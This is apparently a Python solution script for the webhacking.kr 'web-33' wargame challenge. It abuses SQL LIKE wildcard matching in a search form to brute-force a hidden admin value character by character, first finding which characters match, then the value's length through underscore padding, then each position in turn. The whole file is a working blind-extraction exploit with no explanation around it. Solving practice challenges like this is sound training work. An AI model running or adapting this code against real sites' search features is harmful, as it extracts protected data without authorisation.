import requests
import string

url="https://webhacking.kr/challenge/web-33/"
cookies={'PHPSESSID':""}
#ascii_code=string.digits+string.ascii_letters

def findCharType():
    matchChar = ""

    for j in range(123, 127):
        response = requests.post(url, data={'search': chr(j)}, cookies=cookies)
        if response.text.find("<td>admin</td>") > 0:
            #print("(+) Matched -> {}".format(j))
            matchChar += chr(j)

    for j in range(32, 97):
        response = requests.post(url, data={'search': chr(j)}, cookies=cookies)
        if response.text.find("<td>admin</td>") > 0:
            #print("(+) Matched -> {}".format(j))
            matchChar += chr(j)

    print("(+) Matched Character is {}".format(matchChar))
    return matchChar

def findCharLen():
    matchSize = 1

    while True:
        response = requests.post(url, data={'search': "_"*matchSize}, cookies=cookies)
        if response.text.find("<td>admin</td>") > 0:
            matchSize += 1
        else:
            matchSize -= 1
            break;

    #print("(!) Done.")
    print("(+) Character length is {}".format(matchSize))
    return matchSize

def findbyBruteforce(matchChar, matchSize):
    resChar="_"*matchSize
    resChar=list(resChar)
    matchChar=matchChar.replace("%","")

    for index in range(0, matchSize):
        for chrType in matchChar:
            resChar[index]=chrType
            searchChar="".join(resChar)
            response = requests.post(url, data={'search': searchChar}, cookies=cookies)
            if response.text.find("<td>admin</td>") > 0:
                print("(+) Current result value is {}".format("".join(resChar)))
                break

        # print("(!) Done.")
    print("(+) Result value is {}".format("".join(resChar)))

if __name__=="__main__":
    findbyBruteforce(findCharType(), findCharLen())
    print("(!) Done.")